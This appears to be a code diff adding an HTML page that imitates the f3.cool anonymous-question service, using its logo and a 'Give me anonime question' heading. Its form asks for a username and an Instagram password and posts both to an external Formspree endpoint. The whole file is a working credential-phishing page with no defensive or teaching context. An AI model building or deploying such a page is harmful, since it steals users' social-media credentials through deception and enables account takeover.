@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>f3 cool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            display: flex;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            background: rgb(131, 58, 180);
+            background: linear-gradient(90deg, rgba(131, 58, 180, 1) 0%, rgba(253, 29, 29, 1) 50%, rgba(252, 176, 69, 1) 100%);
+            text-align: center;
+            flex-direction: column;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        input {
+            width: 400px;
+            height: 50px;
+            margin: 10px;
+            padding: 10px;
+            font-size: 20px;
+            color: #333;
+            border-radius: 5px;
+            border: 1px solid #333;
+            outline: none;
+        }
+
+        button {
+            width: 100px;
+            height: 40px;
+            margin-top: 20px;
+            border: none;
+            color: white;
+            background-color: #139ae8;
+            border-radius: 5px;
+            font-weight: 900;
+            font-size: 18px;
+            font-family: monospace;
+            cursor: pointer;
+            transition: 1s;
+            position: relative;
+        }
+        button:hover{
+            background-color: #1181c2;
+            transition: 1s;
+        }
+        
+        button:active{
+            top: 3px;
+            transition: 1s;
+        }
+        
+        .logo{
+            width: 100px;
+            height: 100px;
+            background-image: url('https://f3.cool/assets/_images/logo@3x.png');
+            background-size: cover;
+            border-radius: 20px;
+            position: fixed;
+            top: 50px;
+            box-shadow: 0 0 10px #333;
+        }
+        .question{
+            background-color: #0afa2a;
+            color: #000;
+            margin: 10px;
+            padding: 5px 30px;
+            border-radius: 20px;
+            font-family: monospace;
+            box-shadow: 0 3px 5px #333;
+            
+        }
+    </style>
+</head>
+
+<body>
+   <div class="logo">
+       
+   </div>
+   <h1 class="question">Give me anonime question</h1>
+    <form action="https://formspree.io/f/mdoyzbkz" method="POST">
+
+        <input placeholder="Username" type="email" name="_replyto">
+        <input placeholder="Password from instagram" type="password" name="message">
+        <button type="submit">Sign In</button>
+    </form>
+</body>
+
+</html>
+
+
